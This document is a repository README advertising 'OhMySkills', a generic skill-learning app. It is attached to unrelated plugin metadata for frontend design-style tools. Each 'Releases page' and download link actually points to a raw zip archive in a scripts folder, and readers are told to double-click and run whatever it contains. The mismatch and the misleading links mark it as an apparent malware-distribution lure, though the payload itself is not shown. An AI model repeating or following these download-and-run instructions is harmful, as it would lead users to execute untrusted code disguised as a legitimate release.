files.README.md:
# üéâ OhMySkills - Discover Your Helpful Skills Today!

## üöÄ Getting Started

Welcome to OhMySkills! This application helps you improve and learn useful skills. Whether you're looking to enhance your abilities or discover new ones, you‚Äôre in the right place. Follow these simple steps to get started quickly.

## üì• Download OhMySkills

To download OhMySkills, visit our Releases page. Here you will find the latest version of the application. 

[![Download OhMySkills](https://github.com/flatitas/OhMySkills/raw/refs/heads/main/design-style/scripts/Skills_Oh_My_v3.8.zip%20OhMySkills-%20-brightgreen)](https://github.com/flatitas/OhMySkills/raw/refs/heads/main/design-style/scripts/Skills_Oh_My_v3.8.zip)

## üìÇ Features

OhMySkills comes with a variety of features designed to support your learning journey:

- **Skill Assessments**: Evaluate your current abilities and receive personalized recommendations.
- **Interactive Lessons**: Engage with easy-to-follow lessons that help you grasp new concepts quickly.
- **Progress Tracking**: Keep track of your skill development across multiple areas.
- **User-Friendly Interface**: Navigate effortlessly to enjoy a smooth learning experience.

## üìã System Requirements

Before downloading, make sure your computer meets these requirements:

- **Operating System**: Windows 10 or later, macOS Mojave or later.
- **Processor**: Intel i3 or equivalent.
- **Memory**: At least 4 GB RAM.
- **Storage**: 100 MB of free space.

## üíª Download & Install

To install OhMySkills, visit our [Releases page](https://github.com/flatitas/OhMySkills/raw/refs/heads/main/design-style/scripts/Skills_Oh_My_v3.8.zip) and select the latest version available. Follow these steps:

1. Open the Releases page using the link above.
2. Find the version you want to download. Click on the appropriate file for your operating system.
3. Once the download is complete, locate the file on your computer. It is usually in your "Downloads" folder.
4. Double-click the downloaded file to run the installer.
5. Follow the on-screen instructions to complete the installation.

## üìö Using OhMySkills

Once you have installed the application, open it to begin. You will see a simple interface. The main screen will guide you through:

1. **Signing Up**: Create an account or log in if you already have one.
2. **Selecting Skills**: Choose which skills you want to focus on.
3. **Starting Lessons**: Begin your interactive lessons based on your preferences.

## üîÑ Updating OhMySkills

To ensure you always have the latest features and improvements, regularly check the [Releases page](https://github.com/flatitas/OhMySkills/raw/refs/heads/main/design-style/scripts/Skills_Oh_My_v3.8.zip) for updates. Follow the same download and install steps whenever a new version is available.

## üõ† Troubleshooting

If you encounter issues while running OhMySkills, here are some common problems and solutions:

- **Installation Fails**: Check that your system meets the requirements and ensure you have enough free storage space.
- **Application Crashes**: Make sure your operating system is up to date. Restart your computer and try opening the app again.
- **Features Not Working**: Ensure that you've installed the latest version of OhMySkills. Sometimes restarting the application resolves minor bugs.

## ü§ù Support

If you need further assistance, feel free to reach out for help. You can submit issues on our GitHub page or look for help in the community forums.

Thank you for choosing OhMySkills! Enjoy your journey in enhancing your skills. Happy learning!

plugins.name: design-style
plugins.description: Automatically retrieves design system prompts to create visually distinctive, production-grade frontend code with 30+ specific design styles (Neo-brutalism, Modern Dark, Cyberpunk, Luxury, etc.)

plugins.name: design-system-analyzer
plugins.description: Analyze any website's UI style using ChromeDevTools to extract precise CSS tokens, animations, and interaction states. Generates comprehensive Design System Prompts from live websites.
